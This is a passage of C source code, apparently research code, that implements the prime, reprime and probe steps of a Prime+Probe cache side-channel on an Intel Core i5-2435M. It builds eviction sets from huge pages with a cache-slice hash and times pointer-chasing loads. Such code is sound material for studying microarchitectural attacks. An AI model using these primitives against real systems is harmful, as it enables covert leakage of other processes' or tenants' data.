    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    
    //tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    //tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    //tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    //tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", sandybridge_i5_2435m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
}

void sandybridge_i5_2435m_reprime() {
    //printf("sandybridge_i5_2435m_reprime\n");
    volatile char **tmp1 = init_reprime;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
}

unsigned long int sandybridge_i5_2435m_probe() {
    //printf("sandybridge_i5_2435m_probe\n");
    // PROBE & MEASURE
    unsigned long int begin, end;
    unsigned long int tt, max = 0;
    //unsigned long int begin2, end2;
    volatile char **tmp1 = init_prime;
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    //printf("%lu\n", end-begin);
/*
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    begin2 = get_global_timestamp_start();
    end2 = get_global_timestamp_stop();
*/
    //return (end-begin);//-(end2-begin2);
    return max;
}















// Sandy Bridge Method 2 : Use as if there is double associativity instead of using cache slice selection hash function

int sandybridge_i5_2435m_cache_slice_from_virt_m2(void* addr) {
    unsigned long int x = ((unsigned long int*)addr)[0];
    return sandybridge_i5_2435m_cache_slice_alg_m2((void*)(get_pfn(addr) << 12));
}

int sandybridge_i5_2435m_cache_slice_alg_m2(void* addr) {
    //printf("sandybridge_i5_2435m_cache_slice_m2\n");
    //unsigned long int x = ((unsigned long int*)addr)[0];
    //unsigned long int i_addr = (unsigned long int) get_pfn(addr);
    
    //printf("\n%016p : \n", (void *) addr);

    unsigned long int i_addr = (unsigned long int) addr;

/*
    printf("vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv\n");
    printPtr2bin((void *) addr);
    printf("17:%lu 18:%lu 20:%lu 22:%lu 24:%lu 25:%lu 26:%lu 27:%lu 28:%lu 30:%lu\n", ((i_addr & 0x000020000) >> 17), ((i_addr & 0x000040000) >> 18), 
                ((i_addr & 0x000100000) >> 20), ((i_addr & 0x000400000) >> 22), ((i_addr & 0x001000000) >> 24), ((i_addr & 0x002000000) >> 25),
                ((i_addr & 0x004000000) >> 26), ((i_addr & 0x008000000) >> 27), ((i_addr & 0x010000000) >> 28), ((i_addr & 0x040000000) >> 30));
    printf("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
*/

    // According to lackingrhoticity.blogspot.dk/2015/04/l3-cache-mapping-on-sandy-bridge-cpus.html
    // Intel Core i5 2435M (2 core)
    int bit0 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000400000) >> 22) 
             ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x008000000) >> 27) 
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x040000000) >> 30); // ^ ((i_addr & 0x100000000) >> 32) ^ ((i_addr & 0x200000000) >> 33);


    return bit0;
}


// Ivy Bridge i7-3770 FUNCTIONS
    
int sandybridge_i5_2435m_setup_m2(unsigned long int monline) {
    unsigned long int cache_line_check_offset = monline & 0x00001FFFF;
    size_t mem_length = (size_t)MB(2); 
    unsigned long int x = 0;
    //int mem_length_char = ((int)mem_length/sizeof(char));
    //int mem_length_ptr = (int)mem_length/sizeof(void *);

    B = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    C = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    // check if memory was properly allocated

    x += (unsigned long int)B[MB(0)];
    x += (unsigned long int)C[MB(0)];

    //printf("B : %p\n", (void *)get_pfn(B));
    //printf("C : %p\n", (void *)get_pfn(C));

    B[(0x00 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x01 << 17)/8 + cache_line_check_offset/8);
    B[(0x01 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x02 << 17)/8 + cache_line_check_offset/8);
    B[(0x02 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x03 << 17)/8 + cache_line_check_offset/8);
    B[(0x03 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x04 << 17)/8 + cache_line_check_offset/8);
    B[(0x04 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x05 << 17)/8 + cache_line_check_offset/8);
    B[(0x05 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x06 << 17)/8 + cache_line_check_offset/8);
    B[(0x06 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x07 << 17)/8 + cache_line_check_offset/8);
    B[(0x07 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x08 << 17)/8 + cache_line_check_offset/8);
    
    B[(0x08 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x09 << 17)/8 + cache_line_check_offset/8);
    B[(0x09 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x0a << 17)/8 + cache_line_check_offset/8);
    B[(0x0a << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x0b << 17)/8 + cache_line_check_offset/8);
    B[(0x0b << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x0c << 17)/8 + cache_line_check_offset/8);
    B[(0x0c << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x0d << 17)/8 + cache_line_check_offset/8);
    B[(0x0d << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x0e << 17)/8 + cache_line_check_offset/8);
    B[(0x0e << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x0f << 17)/8 + cache_line_check_offset/8);
    B[(0x0f << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x00 << 17)/8 + cache_line_check_offset/8);

    C[(0x00 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x01 << 17)/8 + cache_line_check_offset/8);
    C[(0x01 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x02 << 17)/8 + cache_line_check_offset/8);
    C[(0x02 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x03 << 17)/8 + cache_line_check_offset/8);
    C[(0x03 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x04 << 17)/8 + cache_line_check_offset/8);
    C[(0x04 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x05 << 17)/8 + cache_line_check_offset/8);
    C[(0x05 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x06 << 17)/8 + cache_line_check_offset/8);
    C[(0x06 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x07 << 17)/8 + cache_line_check_offset/8);
    C[(0x07 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x08 << 17)/8 + cache_line_check_offset/8);
    
    C[(0x08 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x09 << 17)/8 + cache_line_check_offset/8);
    C[(0x09 << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x0a << 17)/8 + cache_line_check_offset/8);
    C[(0x0a << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x0b << 17)/8 + cache_line_check_offset/8);
    C[(0x0b << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x0c << 17)/8 + cache_line_check_offset/8);
    C[(0x0c << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x0d << 17)/8 + cache_line_check_offset/8);
    C[(0x0d << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x0e << 17)/8 + cache_line_check_offset/8);
    C[(0x0e << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (0x0f << 17)/8 + cache_line_check_offset/8);
    C[(0x0f << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (0x00 << 17)/8 + cache_line_check_offset/8);

    if ( ((0x07 << 18) + cache_line_check_offset + KB(32)) < MB(2) ) {
        
        B[(0x00 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x01 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x01 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x02 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x02 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x03 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x03 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x04 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x04 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x05 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x05 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x06 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x06 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x07 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x07 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x08 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        
        B[(0x08 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x09 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x09 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x0a << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x0a << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x0b << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x0b << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x0c << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x0c << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x0d << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x0d << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x0e << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x0e << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x0f << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(0x0f << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x00 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        C[(0x00 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x01 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x01 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x02 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x02 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x03 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x03 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x04 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x04 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x05 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x05 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x06 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x06 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x07 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x07 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x08 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        
        C[(0x08 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x09 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x09 << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x0a << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x0a << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x0b << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x0b << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x0c << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x0c << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x0d << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x0d << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x0e << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x0e << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (0x0f << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(0x0f << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (0x00 << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        init_reprime = B + cache_line_check_offset/8 + KB(32)/8;
    } else {

        B[(0x00 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x01 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x01 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x02 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x02 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x03 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x03 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x04 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x04 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x05 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x05 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x06 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x06 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x07 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x07 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x08 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        
        B[(0x08 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x09 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x09 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x0a << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x0a << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x0b << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x0b << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x0c << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x0c << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x0d << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x0d << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x0e << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x0e << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x0f << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(0x0f << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x00 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        C[(0x00 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x01 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x01 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x02 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x02 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x03 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x03 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x04 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x04 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x05 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x05 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x06 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x06 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x07 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x07 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x08 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        
        C[(0x08 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x09 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x09 << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x0a << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x0a << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x0b << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x0b << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x0c << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x0c << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x0d << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x0d << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x0e << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x0e << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (0x0f << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(0x0f << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (0x00 << 17)/8 + cache_line_check_offset/8 - KB(32)/8);


        init_reprime = B + cache_line_check_offset/8 - KB(32)/8;
    }


    init_prime = B + cache_line_check_offset/8;
    

    return 1;
}

void sandybridge_i5_2435m_prime_m2() {
    //printf("sandybridge_i5_2435m_prime_m2\n");
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    volatile char **tmp1 = init_prime;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
}

void sandybridge_i5_2435m_reprime_m2() {
    //printf("sandybridge_i5_2435m_reprime_m2\n");
    volatile char **tmp1 = init_reprime;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
}

unsigned long int sandybridge_i5_2435m_probe_m2() {
    //printf("sandybridge_i5_2435m_probe_m2\n");
    // PROBE & MEASURE
    unsigned long int begin, end;
    unsigned long int tt, max = 0;
    //unsigned long int begin2, end2;
    volatile char **tmp1 = init_prime;
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    /*
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
